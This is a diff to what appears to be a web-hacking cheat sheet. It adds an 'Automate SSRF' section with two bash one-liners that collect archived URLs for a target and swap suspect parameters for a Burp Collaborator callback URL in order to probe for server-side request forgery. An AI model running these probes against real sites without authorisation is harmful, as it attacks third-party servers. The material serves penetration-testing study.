@@ -405,6 +405,15 @@ Connection: close
 [SSRF (Server-Side Request Forgery ).pdf](https://github.com/Mehdi0x90/Web_Hacking/files/12438160/SSRF.Server-Side.Request.Forgery.pdf)
 
 
+# Automate SSRF
+```bash
+# method 1
+echo https://target.com | waybackurls | httpx -silent | gf ssrf | qsreplace <burpcollaborator url> | xarg -I{} http GET {}
+
+# method 2
+echo https://target.com | waybackurls | httpx -silent | gf ssrf | qsreplace <burpcollaborator url> | httpx
+```
+
 # Tools
 
 * https://github.com/swisskyrepo/SSRFmap
